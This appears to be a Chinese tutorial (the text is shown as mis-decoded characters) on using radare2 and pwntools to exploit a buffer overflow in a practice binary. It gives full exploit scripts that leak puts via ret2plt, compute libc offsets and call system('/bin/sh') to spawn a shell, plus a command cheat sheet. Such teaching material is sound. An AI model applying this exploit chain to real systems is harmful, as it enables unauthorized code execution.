<p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯åœ¨ç³»ç»Ÿä¸­äº§ç”Ÿä¸€ä¸ª shellã€‚è¿™æœ‰å¾ˆå¤šç§æ–¹æ³•ï¼Œå°¤å…¶æ˜¯è¿™æ ·ä¸€ä¸ªç¨‹åºã€‚ä¸ºäº†çŸ¥é“æˆ‘ä»¬èƒ½åšä»€ä¹ˆï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“æˆ‘ä»¬ä¸èƒ½åšä»€ä¹ˆã€‚æˆ‘ä»¬çš„ç¨‹åºåœ¨å¼€äº†<code>ASLR</code>åœ°ç¯å¢ƒä¸‹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½çŒœæµ‹åˆ°<a href="https://en.wikipedia.org/wiki/C_standard_library" target="_blank" rel="noopener"><em>libc</em></a>åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚é‚£å°±å¯ä»¥å’Œ<a href="https://en.wikipedia.org/wiki/Return-to-libc_attack" target="_blank" rel="noopener"><em>ret2libc</em></a>è¯´å†è§äº†ã€‚å¦å¤–ï¼Œç¨‹åºå¼€äº†<code>NX</code>ï¼Œè¿™æ„å‘³æ ˆæ˜¯ä¸å¯æ‰§è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥åœ¨æ ˆä¸Šæ”¾ä¸€ä¸ª<a href="https://en.wikipedia.org/wiki/Shellcode" target="_blank" rel="noopener"><em>shellcode</em></a>ç„¶åè·³è¿‡å»ã€‚</p>
<p>è™½ç„¶è¿™äº›ä¿æŠ¤è®©æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨ä¸€äº›æ¼æ´åˆ©ç”¨æŠ€æœ¯ï¼Œç„¶è€Œè¿™ä¸èƒ½é˜»æ­¢æˆ‘ä»¬è½»æ¾åœ°ç»•è¿‡å®ƒä»¬ã€‚ç¼–å†™æˆ‘ä»¬çš„è„šæœ¬æ—¶ï¼Œéœ€è¦ç»†å¿ƒåœ°è§‚å¯Ÿæä¾›ç»™æˆ‘ä»¬çš„è¿è¡Œåº“ä»¥åŠå‡½æ•°ã€‚</p>
<p>è®©æˆ‘ä»¬å†æ¬¡é€šè¿‡è°ƒè¯•æ¨¡å¼æ‰“å¼€ç¨‹åºï¼Œç„¶åçœ‹ä¸€çœ‹å®ƒä½¿ç”¨çš„è¿è¡Œåº“å’Œå‡½æ•°ã€‚å…ˆçœ‹åº“ï¼š</p>
<pre><code class="shell">
$ r2 -d megabeets_0x2
Process with PID 23072 startedâ€¦
= attach 23072 23072
bin.baddr 0x08048000
Using 0x8048000
Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2
asm.bits 32
â€” You haxor! Me jane?
[0xf7763b30]&gt; il
[Linked libraries]
libc.so.61 library
</code></pre>
<p><code>il</code>è¡¨ç¤º<code>Information libraries</code>ï¼Œå³å‘Šè¯‰æˆ‘ä»¬ç¨‹åºæ‰€ä½¿ç”¨çš„è¿è¡Œåº“ã€‚å¯¹äºè¯¥ç¨‹åºæ¥è¯´ï¼Œåªæœ‰æˆ‘ä»¬æœ€çˆ±çš„<em>libc</em>ã€‚</p>
<p>ç°åœ¨é€šè¿‡æ‰§è¡Œ<code>ii</code>å‘½ä»¤â€”â€”<code>Information Imports</code>ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹å¯¼å…¥çš„å‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥åŠ ä¸Š<code>q</code>æ¥å‡å°‘å†—é•¿çš„è¾“å‡ºï¼š</p>
<pre><code class="shell">[0xf7763b30]&gt; ii
[Imports]
ordinal=001 plt=0x08048370 bind=GLOBAL type=FUNC name=strcmp
ordinal=002 plt=0x08048380 bind=GLOBAL type=FUNC name=strcpy
ordinal=003 plt=0x08048390 bind=GLOBAL type=FUNC name=puts
ordinal=004 plt=0x00000000 bind=WEAK type=NOTYPE name=__gmon_start__
ordinal=005 plt=0x080483a0 bind=GLOBAL type=FUNC name=__libc_start_main
ordinal=006 plt=0x080483b0 bind=GLOBAL type=FUNC name=__isoc99_scanf6 imports

[0xf7763b30]&gt; iiq
strcmp
strcpy
puts
__gmon_start__
__libc_start_main
__isoc99_scanf
</code></pre>
<h2 id="è®¡åˆ’"><a href="#è®¡åˆ’" class="headerlink" title="è®¡åˆ’"></a>è®¡åˆ’</h2><ul>
<li>æ³„æ¼<code>puts</code>çš„çœŸå®åœ°å€</li>
<li>è®¡ç®—<em>libc</em>çš„åŸºå€</li>
<li>è®¡ç®—<code>system</code>çš„åœ°å€</li>
<li>åœ¨<em>libc</em>ä¸­æ‰¾åˆ°åŒ…å«å­—ç¬¦ä¸²<code>/bin/sh</code>çš„åœ°å€</li>
<li>è°ƒç”¨<code>system(&quot;/bin/sh&quot;)</code>æ‰“å¼€ä¸€ä¸ª shell</li>
</ul>
<h2 id="æ³„æ¼putsçš„åœ°å€"><a href="#æ³„æ¼putsçš„åœ°å€" class="headerlink" title="æ³„æ¼putsçš„åœ°å€"></a>æ³„æ¼<code>puts</code>çš„åœ°å€</h2><p>æˆ‘ä»¬éœ€è¦ç”¨åˆ°<code>ret2plt</code>æ¥æ³„æ¼<code>puts</code>çš„çœŸå®åœ°å€ã€‚<code>PLT</code>ï¼ˆ<em>Procedure Linkage Table</em>ï¼‰æ˜¯å†…å­˜ä¸­çš„ç»“æ„ä½“ï¼Œå®ƒåŒ…æ‹¬ä¸€å°æ®µä»£ç ï¼Œèƒ½å¤Ÿè·³è½¬åˆ°åœ¨åŠ¨æ€é“¾æ¥æ—¶ç¨‹åºä¹‹å¤–çš„å‡½æ•°åœ°å€ã€‚ä¸ç®¡ä»€ä¹ˆæ—¶å€™ï¼Œæˆ‘ä»¬åœ¨<code>.text</code>æ®µçœ‹åˆ°<code>CALL</code>æŒ‡ä»¤ï¼Œå¹¶ä¸æ˜¯ç›´æ¥è·³åˆ°å‡½æ•°ã€‚å®é™…ä¸Šï¼Œå®ƒè·³è½¬åˆ°äº†<code>PLT</code>ä¸­çš„ä¸€å°æ®µä»£ç ï¼Œåƒæ˜¯<code>func_name@plt</code>è¿™æ ·ã€‚è¿™ä¸€å°æ®µä»£ç è·³è½¬åˆ°<code>GOT</code>ï¼ˆ<em>Global Offset Table</em>ï¼‰ä¸­çš„åˆ—å‡ºçš„è¯¥å‡½æ•°çš„åœ°å€ã€‚<code>GOT</code>è¡¨å…¥å£ç‚¹ä¼šæŒ‡å›<code>PLT</code>ï¼ŒåŒæ—¶<code>PLT</code>ä¼šè°ƒç”¨ä¸€ä¸ªåŠ¨æ€é“¾æ¥å™¨æ¥ç¡®å®šè¯¥å‡½æ•°çš„çœŸå®åœ°å€ã€‚ä¸‹ä¸€æ¬¡è°ƒç”¨<code>func_name@plt</code>æ—¶ï¼Œè¿™æ®µä»£ç ä¼šç›´æ¥è·³è½¬åˆ°<code>GOT</code>è¡¨é‡Œçš„å‡½æ•°åœ°å€ã€‚æƒ³è¦äº†è§£æ›´å¤šå…³äºåŠ¨æ€é“¾æ¥çš„çŸ¥è¯†ï¼Œæˆ‘æ¨èä¼Šæ©å…°æ–¯æ³°å‹’å†™çš„<a href="https://www.airs.com/blog/archives/38" target="_blank" rel="noopener">è¿™ä¸€ç³»åˆ—å…³äºé“¾æ¥å™¨çš„æ–‡ç« </a></p>
<p>ä¸ºäº†è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°<code>puts</code>åœ¨<code>PLT</code>ä»¥åŠ<code>GOT</code>ä¸­çš„åœ°å€ï¼Œç„¶åè°ƒç”¨<code>puts@plt</code>å¹¶ä¸”æŠŠ<code>puts@got</code>ä½œä¸ºå‚æ•°ã€‚æˆ‘ä»¬å°†æŠŠè¿™äº›è°ƒç”¨è¿åœ¨ä¸€èµ·ï¼Œåœ¨<code>scanf</code>æ—¶ä¼ ç»™ç¨‹åºã€‚ç„¶åæˆ‘ä»¬ä¼šè¿”å›åˆ°æˆ‘ä»¬åˆ©ç”¨çš„ç¬¬äºŒä¸ªé˜¶æ®µã€‚<code>puts</code>å°†ä¼šæŠŠå®ƒçœŸå®çš„åœ°å€è¾“å‡ºå‡ºæ¥ã€‚</p>
<pre><code>+---------------------+
|       Stage 1       |
+---------------------+
| padding (140 bytes) |
| puts@plt            |
| entry_point         |
| puts@got            |
+---------------------+
</code></pre><p>ç¼–å†™è„šæœ¬æˆ‘ä»¬éœ€è¦ä½¿ç”¨<a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener"><em>pwnlib</em></a>æ¡†æ¶ï¼Œè€Œä¸”å®ƒæ˜¯æˆ‘æœ€å–œæ¬¢çš„ python æ¼æ´åˆ©ç”¨æ¡†æ¶ã€‚ä»–ç®€åŒ–äº†å¾ˆå¤šä¸œè¥¿ï¼Œè®©åˆ©ç”¨æ›´ç®€ä¾¿ã€‚å½“ç„¶ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–ä½ å–œæ¬¢çš„æ–¹å¼ã€‚</p>
<p>ä½¿ç”¨<code>pip</code>ä¸‹è½½<em>pwntools</em>ï¼š</p>
<pre><code class="shell">$ pip install --upgrade pip
$ pip install --upgrade pwntools
</code></pre>
<p>ä½ å¯ä»¥åœ¨<a href="http://docs.pwntools.com/en/stable/index.html" target="_blank" rel="noopener">å®˜æ–¹æ–‡æ¡£</a>ä¸Šäº†è§£æ›´å¤šå…³äº<em>pwntools</em>ã€‚</p>
<p>è¿™æ˜¯æˆ‘ä»¬ç¬¬ä¸€é˜¶æ®µçš„ python è„šæœ¬ï¼š</p>
<pre><code class="python">from pwn import *

# Addresses
puts_plt =
puts_got =
entry_point =

# context.log_level = &quot;debug&quot;

def main():

    # open process
    p = process(&quot;./megabeets_0x2&quot;)

    # Stage 1

    # Initial payload
    payload  =  &quot;A&quot;*140 # padding
    ropchain =  p32(puts_plt)
    ropchain += p32(entry_point)
    ropchain += p32(puts_got)

    payload = payload + ropchain

    p.clean()
    p.sendline(payload)

    # Take 4 bytes of the output
    leak = p.recv(4)
    leak = u32(leak)
    log.info(&quot;puts is at: 0x%x&quot; % leak)
    p.clean()


if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<p>æˆ‘ä»¬éœ€è¦å¡«å……<code>puts@plt</code>å’Œ<code>puts@got</code>çš„åœ°å€ï¼Œä»¥åŠç¨‹åºçš„å…¥å£ç‚¹ã€‚è®©æˆ‘ä»¬å›åˆ°<code>radare2</code>å¹¶æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ã€‚å­—ç¬¦<code>#</code>ç”¨äºæ³¨é‡Šï¼Œå­—ç¬¦<code>~</code>æ˜¯<code>radare2</code>çš„ shell ä¸­çš„å†…ç½®<code>grep</code>ã€‚</p>
<pre><code class="shell">[0xf7763b30]&gt; # the address of puts@plt:
[0xf7763b30]&gt; ?v sym.imp.puts
0x08048390
[0xf7763b30]&gt; # the address of puts@got:
[0xf7763b30]&gt; ?v reloc.puts_20
0x0804a014
[0xf7763b30]&gt; # the address of programâ€™s entry point (entry0):
[0xf7763b30]&gt; ieq
0x080483d0
</code></pre>
<p><code>sym.imp.puts</code>å’Œ<code>reloc.puts_20</code>æ˜¯<code>radare2</code>è‡ªåŠ¨æ£€æµ‹åˆ°çš„æ ‡å¿—ã€‚å‘½ä»¤<code>ie</code>è¡¨ç¤º<code>Information Entrypoint</code>ã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬å¡«å…¥æˆ‘ä»¬æ‰¾åˆ°çš„åœ°å€ï¼š</p>
<pre><code class="python">...

# Addresses
puts_plt = 0x8048390
puts_got = 0x804a014
entry_point = 0x80483d0

...
</code></pre>
<p>æˆ‘ä»¬æ‰§è¡Œä¸€ä¸‹è„šæœ¬ï¼š</p>
<pre><code class="shell">$ python exploit.py
[+] Starting local process â€˜./megabeets_0x2â€™: pid 23578
[*] puts is at: 0xf75db710
[*] Stopped process â€˜./megabeets_0x2â€™ (pid 23578)

$ python exploit.py
[+] Starting local process â€˜./megabeets_0x2â€™: pid 23592
[*] puts is at: 0xf7563710
[*] Stopped process â€˜./megabeets_0x2â€™ (pid 23592)

$ python exploit.py
[+] Starting local process â€˜./megabeets_0x2â€™: pid 23606
[*] puts is at: 0xf75e3710
[*] Stopped process â€˜./megabeets_0x2â€™ (pid 23606)
</code></pre>
<p>æˆ‘æ‰§è¡Œäº†è„šæœ¬ä¸‰æ¬¡ï¼Œ<code>puts</code>çš„åœ°å€æ¯æ¬¡éƒ½ä¼šå˜å¾—ä¸ä¸€æ ·ã€‚å› æ­¤æˆ‘ä»¬ä¸èƒ½æå‰é¢„æµ‹å®ƒçš„åœ°å€ã€‚ç°åœ¨æˆ‘ä»¬éœ€è¦æ‰¾åˆ°<code>puts</code>åœ¨<em>libc</em>ä¸­çš„åç§»ï¼Œç„¶åè®¡ç®—å‡º<em>libc</em>çš„åŸºå€ã€‚åœ¨æˆ‘ä»¬æ‰¾åˆ°åŸºå€åï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åç§»è®¡ç®—å‡º<code>system</code>ã€<code>exit</code>ä»¥åŠå­—ç¬¦ä¸²<code>/bin/sh</code>çš„åœ°å€ã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬çš„è„šæœ¬åº”è¯¥æ˜¯è¿™æ ·ï¼š</p>
<pre><code class="python">from pwn import *

# Addresses
puts_plt = 0x8048390
puts_got = 0x804a014
entry_point = 0x80483d0

# Offsets
offset_puts =
offset_system =
offset_str_bin_sh =
offset_exit =

# context.log_level = &quot;debug&quot;

def main():

    # open process
    p = process(&quot;./megabeets_0x2&quot;)

    # Stage 1

    # Initial payload
    payload  =  &quot;A&quot;*140
    ropchain =  p32(puts_plt)
    ropchain += p32(entry_point)
    ropchain += p32(puts_got)

    payload = payload + ropchain

    p.clean()
    p.sendline(payload)

    # Take 4 bytes of the output
    leak = p.recv(4)
    leak = u32(leak)
    log.info(&quot;puts is at: 0x%x&quot; % leak)

    p.clean()

    # Calculate libc base

    libc_base = leak - offset_puts
    log.info(&quot;libc base: 0x%x&quot; % libc_base)

    # Stage 2

    # Calculate offsets
    system_addr = libc_base + offset_system
    binsh_addr = libc_base + offset_str_bin_sh
    exit_addr = libc_base  + offset_exit

    log.info(&quot;system: 0x%x&quot; % system_addr)
    log.info(&quot;binsh: 0x%x&quot; % binsh_addr)
    log.info(&quot;exit: 0x%x&quot; % exit_addr)

if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<h2 id="è®¡ç®—çœŸå®åœ°å€"><a href="#è®¡ç®—çœŸå®åœ°å€" class="headerlink" title="è®¡ç®—çœŸå®åœ°å€"></a>è®¡ç®—çœŸå®åœ°å€</h2><p><em>è¯·æ³¨æ„åœ¨æ–‡ç« çš„è¿™éƒ¨åˆ†ï¼Œæˆ‘çš„ç»“æœå¯èƒ½ä¸ä½ çš„ä¸åŒã€‚å› ä¸ºæˆ‘ä»¬çš„ libc ç‰ˆæœ¬ä¸åŒï¼Œæ‰€ä»¥ä¼šäº§ç”Ÿä¸åŒçš„åç§»ã€‚</em></p>
<p>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ‰¾åˆ°<code>puts</code>åœ¨<em>libc</em>ä¸Šçš„åç§»ã€‚æˆ‘ä»¬å†ä¸€æ¬¡æ‰“å¼€<code>radare2</code>ï¼Œç»§ç»­æ‰§è¡Œåˆ°å…¥å£ç‚¹ã€‚åšä»¥ä¸Šæ­¥éª¤çš„åŸå› æ˜¯æˆ‘ä»¬åœ¨<em>libc</em>è½½å…¥ä¹‹å‰å¼€å§‹è°ƒè¯•ç¨‹åºï¼Œç›´åˆ°å…¥å£ç‚¹æ—¶ï¼Œè¿è¡Œåº“æ‰å…¨éƒ¨åŠ è½½å®Œã€‚</p>
<p>æˆ‘ä»¬ä½¿ç”¨<code>dmi</code>å‘½ä»¤ï¼Œå°†<em>libc</em>å’Œå‡½æ•°ä½œä¸ºå‚æ•°ã€‚æˆ‘åŠ ä¸Šäº†<code>~</code>æ¥æ˜¾ç¤ºç›¸å…³çš„ä¿¡æ¯ã€‚</p>
<pre><code class="shell">$ r2 -d megabeets_0x2
Process with PID 24124 startedâ€¦
= attach 24124 24124
bin.baddr 0x08048000
Using 0x8048000
Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2
asm.bits 32
â€” A C program is like a fast dance on a newly waxed dance floor by people carrying razors â€“ Waldi Ravens

[0xf771ab30]&gt; dcu entry0
Continue until 0x080483d0 using 1 bpsize
hit breakpoint at: 80483d0

[0x080483d0]&gt; dmi libc puts~ puts$
vaddr=0xf758f710 paddr=0x00062710 ord=6490 fwd=NONE sz=474 bind=GLOBAL type=FUNC name=puts

[0x080483d0]&gt; dmi libc system~ system$
vaddr=0xf7569060 paddr=0x0003c060 ord=6717 fwd=NONE sz=55 bind=WEAK type=FUNC name=system

[0x080483d0]&gt; dmi libc exit~ exit$
vaddr=0xf755c180 paddr=0x0002f180 ord=5904 fwd=NONE sz=33 bind=LOCAL type=FUNC name=exit
</code></pre>
<p><em>è¯·æ³¨æ„ï¼Œåœ¨è¿™ç¯‡æ–‡ç« å‘è¡¨å‰ï¼Œ<code>dmi</code>çš„è¾“å‡ºæ ¼å¼å°±å·²ç»æ”¹å˜äº†ã€‚ä½ çš„ç»“æœå¾ˆæœ‰å¯èƒ½ä¸æˆ‘çš„æœ‰æ‰€ä¸åŒã€‚</em></p>
<p>æ‰€æœ‰è¿™äº›<code>paddr=0x000xxxxx</code>æ˜¯å‡½æ•°åœ¨<em>libc</em>ä¸Šçš„åç§»ã€‚ç°åœ¨æˆ‘ä»¬éœ€è¦åœ¨ç¨‹åºä¸­æ‰¾åˆ°<code>/bin/sh</code>çš„ä½ç½®ã€‚æˆ‘ä»¬å°†è¦ä½¿ç”¨<code>radare2</code>çš„ä¸€äº›æœç´¢åŠŸèƒ½ã€‚<code>radare2</code>é»˜è®¤åœ¨<code>dbg.map</code>ï¼Œä¹Ÿå°±æ˜¯å½“å‰å†…å­˜ä¸­æŸ¥æ‰¾ã€‚æˆ‘ä»¬æƒ³è¦åœ¨æ‰€æœ‰å†…å­˜ä¸­æŸ¥æ‰¾åˆ™éœ€è¦è®¾ç½®æˆï¼š</p>
<pre><code class="shell">[0x080483d0]&gt; e search.in = dbg.maps
</code></pre>
<p>ä½ å¯ä»¥æ‰§è¡Œ<code>e search.in=?</code>æŸ¥çœ‹æ›´å¤šé€‰é¡¹ã€‚æ‰§è¡Œ<code>Ve</code>é…ç½®å¯è§†åŒ–æ¨¡å¼</p>
<p>åœ¨<code>radare2</code>ä¸­é€šè¿‡<code>/</code>å‘½ä»¤æŸ¥æ‰¾ã€‚è®©æˆ‘ä»¬çœ‹çœ‹<code>radare2</code>ç»™æˆ‘ä»¬æä¾›çš„æŸ¥æ‰¾å‚æ•°ï¼š</p>
<pre><code class="shell">|Usage: /[amx/] [arg]Search stuff (see â€˜e??searchâ€™ for options)
| / foo\x00           search for string â€˜foo\0â€™
| /j foo\x00          search for string â€˜foo\0â€™ (json output)
| /! ff               search for first occurrence not matching
| /+ /bin/sh          construct the string with chunks
| /!x 00              inverse hexa search (find first byte != 0x00)
| //                  repeat last search
| /h[t] [hash] [len]  find block matching this hash. See /#?
| /a jmp eax          assemble opcode and search its bytes
| /A jmp              find analyzed instructions of this type (/A? for help)
| /b                  search backwards
| /B                  search recognized RBin headers
| /c jmp [esp]        search for asm code
| /C[ar]              search for crypto materials
| /d 101112           search for a deltified sequence of bytes
| /e /E.F/i           match regular expression
| /E esil-expr        offset matching given esil expressions %%= here
| /f file [off] [sz]  search contents of file with offset and size
| /i foo              search for string â€˜fooâ€™ ignoring case
| /m magicfile        search for matching magic file (use blocksize)
| /o                  show offset of previous instruction
| /p patternsize      search for pattern of given size
| /P patternsize      search similar blocks
| /r[e] sym.printf    analyze opcode reference an offset (/re for esil)
| /R [?] [grepopcode] search for matching ROP gadgets, semicolon-separated
| /v[1248] value      look for an cfg.bigendian 32bit value
| /V[1248] min max    look for an cfg.bigendian 32bit value in range
| /w foo              search for wide string â€˜f\0o\0o\0â€™
| /wi foo             search for wide string ignoring case â€˜f\0o\0o\0â€™
| /x ff..33           search for hex string ignoring some nibbles
| /x ff0033           search for hex string
| /x ff43 ffd0        search for hexpair with mask
| /z min max          search for strings of given size
</code></pre>
<p>æä¾›ç»™æˆ‘ä»¬äº†è®¸å¤šä¸åŒçš„æ–¹å¼ã€‚åŒæ—¶è¿˜å‘å¿ƒ<code>/R</code>èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬æŸ¥æ‰¾ ROPã€‚å¯æƒœè¿™ç¯‡æ–‡ç« é‡Œæˆ‘ä»¬æ²¡æœ‰æ‰“ç®—ä½¿ç”¨ ROPã€‚ä½†å…¶ä»–æƒ…å†µä¸‹ï¼Œä½ ä»¬å†™åˆ©ç”¨è„šæœ¬æ—¶ä¸€å®šå¾ˆå–œæ¬¢ç”¨å®ƒã€‚</p>
<p>æˆ‘ä»¬ä¸éœ€è¦ä»»ä½•èŠ±å“¨çš„ä¸œè¥¿ï¼Œåªç”¨æœ€ç®€å•çš„æŸ¥æ‰¾å³å¯ã€‚åœ¨è¿™ä¹‹åï¼Œæˆ‘ä»¬å…ˆæ‰¾åˆ°å½“å‰<em>libc</em>è½½å…¥çš„åœ°å€ï¼Œç„¶åè®¡ç®—å‡º<code>/bin/sh</code>çš„åç§»ã€‚</p>
<pre><code class="shell">[0x080483d0]&gt; / /bin/sh
Searching 7 bytes from 0x08048000 to 0xffd50000: 2f 62 69 6e 2f 73 68
Searching 7 bytes in [0x8048000-0x8049000]
hits: 0
Searching 7 bytes in [0x8049000-0x804a000]
hits: 0 &lt;..truncated..&gt; Searching 7 bytes in [0xf77aa000-0xf77ab000]
hits: 0
Searching 7 bytes in [0xffd2f000-0xffd50000]
hits: 0
0xf7700768 hit1_0 .b/strtod_l.c-c/bin/shexit 0canonica.
</code></pre>
<p><code>r2</code>åœ¨å†…å­˜ä¸­æ‰¾åˆ°äº†<code>/bin/sh</code>ã€‚ç°åœ¨æˆ‘ä»¬è®¡ç®—å®ƒç›¸å¯¹<em>libc</em>åŸºå€çš„åç§»ï¼š</p>
<pre><code class="shell">[0x080483d0]&gt; dmm~libc
0xf7599000 /usr/lib32/libc-2.25.so
[0x080483d0]&gt; ?X 0xf7700768-0xf7599000
167768
</code></pre>
<p>æˆ‘ä»¬å‘ç°<code>/bin/sh</code>ç›¸å¯¹<em>libc</em>åŸºå€çš„åç§»ä¸º<code>0x167768</code>ã€‚æˆ‘ä»¬æŠŠå®ƒå¡«è¿›è„šæœ¬ä¸­ï¼Œå¹¶ä¸”å¯ä»¥å¼€å§‹æˆ‘ä»¬çš„æœ€åä¸€ä¸ªæ­¥éª¤ã€‚</p>
<pre><code class="python">...

# Offsets
offset_puts = 0x00062710
offset_system = 0x0003c060
offset_exit = 0x0002f1b0
offset_str_bin_sh = 0x167768

...
</code></pre>
<h2 id="è·å–-shell"><a href="#è·å–-shell" class="headerlink" title="è·å– shell"></a>è·å– shell</h2><p>æ¼æ´åˆ©ç”¨çš„ç¬¬äºŒé˜¶æ®µå¾ˆç›´æ¥ã€‚æˆ‘ä»¬ç»§ç»­ä½¿ç”¨ 140 ä¸ªå­—ç¬¦ï¼Œç„¶åè°ƒç”¨<code>system</code>å¹¶å°†<code>/bin/sh</code>ä½œä¸ºå‚æ•°ï¼Œæœ€å<code>exit</code>ã€‚</p>
<pre><code>+---------------------+
|       Stage 2       |
+---------------------+
| padding (140 bytes) |
| system@libc         |
| exit@libc           |
| /bin/sh address     |
+---------------------+
</code></pre><p>è¿˜è®°å¾—ä¸Šä¸€æ¬¡æˆ‘ä»¬è¿”å›åˆ°äº†å…¥å£ç‚¹å—ï¼Ÿè¿™æ„å‘³ç€<code>scanf</code>åˆåœ¨ç­‰å¾…æˆ‘ä»¬çš„è¾“å…¥ã€‚ç°åœ¨æˆ‘ä»¬æ‰€åšçš„å°±æ˜¯æŠŠè¿™äº›è°ƒç”¨ä¸²è”èµ·æ¥ä¼ ç»™ç¨‹åºã€‚</p>
<p>è¿™æ˜¯æˆ‘ä»¬æœ€åçš„è„šæœ¬ã€‚åƒæˆ‘ä¹‹å‰æ‰€è¯´çš„ï¼Œä½ åªéœ€è¦æ›¿æ¢ç¬¦åˆä½ çš„<em>libc</em>çš„åç§»ã€‚</p>
<pre><code class="python">from pwn import *

# Addresses
puts_plt = 0x8048390
puts_got = 0x804a014
entry_point = 0x80483d0

# Offsets
offset_puts = 0x00062710
offset_system = 0x0003c060
offset_exit = 0x0002f1b0
offset_str_bin_sh = 0x167768

# context.log_level = &quot;debug&quot;

def main():

    # open process
    p = process(&quot;./megabeets_0x2&quot;)

    # Stage 1

    # Initial payload
    payload  =  &quot;A&quot;*140
    ropchain =  p32(puts_plt)
    ropchain += p32(entry_point)
    ropchain += p32(puts_got)

    payload = payload + ropchain

    p.clean()
    p.sendline(payload)

    # Take 4 bytes of the output
    leak = p.recv(4)
    leak = u32(leak)
    log.info(&quot;puts is at: 0x%x&quot; % leak)
    p.clean()

    # Calculate libc base
    libc_base = leak - offset_puts
    log.info(&quot;libc base: 0x%x&quot; % libc_base)

    # Stage 2

    # Calculate offsets
    system_addr = libc_base + offset_system
    exit_addr = libc_base  + offset_exit
    binsh_addr = libc_base + offset_str_bin_sh

    log.info(&quot;system is at: 0x%x&quot; % system_addr)
    log.info(&quot;/bin/sh is at: 0x%x&quot; % binsh_addr)
    log.info(&quot;exit is at: 0x%x&quot; % exit_addr)

    # Build 2nd payload
    payload2  =  &quot;A&quot;*140
    ropchain2 =  p32(system_addr)
    ropchain2 += p32(exit_addr)
    # Optional: Fix disallowed character by scanf by using p32(binsh_addr+5)
    #           Then you&#39;ll execute system(&quot;sh&quot;)
    ropchain2 += p32(binsh_addr)

    payload2 = payload2 + ropchain2
    p.sendline(payload2)

    log.success(&quot;Here comes the shell!&quot;)

    p.clean()
    p.interactive()

if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<p>è·‘è¿™ä¸ªè„šæœ¬æˆ‘ä»¬å°±èƒ½æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª shellï¼š</p>
<pre><code class="shell">$ python exploit.py
[+] Starting local process â€˜./megabeets_0x2â€™: pid 24410
[*] puts is at: 0xf75db710
[*] libc base: 0xf75ce000
[*] system is at: 0xf760a060
[*] /bin/sh is at: 0xf7735768
[*] exit is at: 0xf75fd1b0
[+] Here comes the shell!
[*] Switching to interactive mode:

$ whoami
beet
$ echo EOF
EOF
</code></pre>
<h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p><code>Radare2</code>ä¹‹æ—…çš„ç¬¬äºŒéƒ¨åˆ†å°±åˆ°æ­¤ç»“æŸäº†ã€‚æˆ‘ä»¬ç®€å•åœ°å­¦ä¹ äº†ä¸€äº›<code>radare2</code>ä¸­æ¼æ´åˆ©ç”¨çš„åŠŸèƒ½ã€‚åœ¨ä¸‹ä¸€éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬ä¼šå­¦ä¹ <code>radare2</code>å†è„šæœ¬ç¼–å†™å’Œæ¶æ„è½¯ä»¶åˆ†æä¸­çš„åŠŸèƒ½ã€‚</p>
<h1 id="æ¼æ´åˆ©ç”¨å‘½ä»¤å¯¹åº”è¡¨"><a href="#æ¼æ´åˆ©ç”¨å‘½ä»¤å¯¹åº”è¡¨" class="headerlink" title="æ¼æ´åˆ©ç”¨å‘½ä»¤å¯¹åº”è¡¨"></a>æ¼æ´åˆ©ç”¨å‘½ä»¤å¯¹åº”è¡¨</h1><p>è¿™æ˜¯ä¸€ç³»åˆ—æˆ‘åœ¨æœ¬æ–‡ä¸­æåˆ°çš„å‘½ä»¤ï¼ˆè¿˜æœ‰ä¸€äº›è¡¥å……ï¼‰ã€‚ä½ å¯ä»¥æŠŠå®ƒä½œä¸ºä¸€ä»½å‚è€ƒè¡¨ã€‚</p>
<h2 id="è·å–ä¿¡æ¯"><a href="#è·å–ä¿¡æ¯" class="headerlink" title="è·å–ä¿¡æ¯"></a>è·å–ä¿¡æ¯</h2><ul>
<li><code>$ rabin2 -I ./program</code>â€”â€”äºŒè¿›åˆ¶ä¿¡æ¯ï¼ˆå’Œ<code>radare2</code>çš„ shell ä¸­<code>i</code>å‘½ä»¤ç›¸åŒï¼‰</li>
<li><code>ii [q]</code>â€”â€”å¯¼å…¥è¡¨</li>
<li><code>?v sym.imp.func_name</code>â€”â€”è·å–<code>func_name@PLT</code>åœ°å€</li>
<li><code>?v reloc.func_name</code>â€”â€”è·å–<code>func_name@GOT</code>åœ°å€</li>
<li><code>ie [q]</code>â€”â€”è·å–å…¥å£ç‚¹åœ°å€</li>
<li><code>iS</code>â€”â€”æŸ¥çœ‹åŒºæ®µçš„å„ä¸ªæƒé™ï¼ˆè¯»/å†™/æ‰§è¡Œï¼‰</li>
<li><code>i~canary</code>â€”â€”æ£€æŸ¥æ˜¯å¦å¼€å¯<code>Canary</code></li>
<li><code>i~pic</code>â€”â€”æ£€æŸ¥æ˜¯å¦å¼€å¯<code>PIE</code></li>
<li><code>i~nx</code>â€”â€”æ£€æŸ¥æ˜¯å¦å¼€å¯<code>NX</code></li>
</ul>
<h2 id="å†…å­˜"><a href="#å†…å­˜" class="headerlink" title="å†…å­˜"></a>å†…å­˜</h2><ul>
<li><code>dm</code>â€”â€”æŸ¥çœ‹å†…å­˜ä¿¡æ¯</li>
